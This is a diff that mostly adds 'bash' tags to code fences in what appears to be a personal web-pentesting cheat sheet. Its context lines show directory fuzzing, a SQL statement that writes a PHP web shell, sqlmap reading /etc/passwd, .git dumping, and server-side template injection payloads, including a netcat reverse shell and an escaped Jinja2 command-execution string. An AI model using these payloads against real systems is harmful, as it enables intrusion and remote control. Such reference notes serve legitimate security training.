@@ -22,28 +22,28 @@
 | Dirb                      | `/usr/share/dirb/wordlists/common.txt`                                  |
 
 ### ffuf
-```
+```bash
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/FUZZ'
 ```
-```
+```bash
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/ -H 'Host: FUZZ.host'
 ```
 
 ### Gobuster
-```
+```bash
 gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 25 -x html,php
 ```
 
 ### Dirb
-```
+```bash
 dirb url -R
 ```
 
 ### GUI
-```
+```bash
 dirbuster
 ```
-```
+```bash
 owasp-zap
 ```
 
@@ -55,7 +55,7 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 
 ## MySql
 ### Connect to mysql
-```
+```bash
 mysql -h localhost -u myname -p
 ```
 ### Show Info
@@ -66,7 +66,7 @@ SHOW TABLES;
 select * from table_name
 ```
 ### Open SQLite3
-```
+```bash
 sqlite3 database.sqlite3
 ```
 or open in vs code
@@ -98,7 +98,7 @@ See [this page](../wiki/Cloud.md)
 
 ## SQL Injection
 ### SQLmap
-```
+```bash
 # See Vulnerability
 sqlmap -r req --batch
 # Check Passwords
@@ -122,7 +122,7 @@ sqlmap -r req --file-read=/etc/passwd
 
 ## Request
 ### Curl
-```
+```bash
 curl 'http://example.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=login&password=pass'
 ```
 
@@ -162,7 +162,7 @@ print(r.status_code, r.url)
 ```
 
 ## Download .git
-```
+```bash
 githacker --url http://url/.git/ --folder result
 ```
 [Source](https://github.com/WangYihang/GitHacker)
@@ -196,32 +196,26 @@ githacker --url http://url/.git/ --folder result
 ```
 
 ## SSTI
-
-https://github.com/DiogoMRSilva/websitesVulnerableToSSTI
+[Github Websites Vulnerable To SSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
 
 #### Nunchucks (Nodejs)
-
 ```
 {{range.constructor("console.log(123)")()}} => 123
 {{range.constructor("return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f')")()}}
 ```
 
 #### Python (Jinja2)
-
 ```
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
 
 #### Golang
-
 ```
 {{.}}
 ```
 
 ## CMS
-
 #### Scaning
-
-```
+```bash
 wpscan --force update -e --url IP --disable-tls-checks
 ```
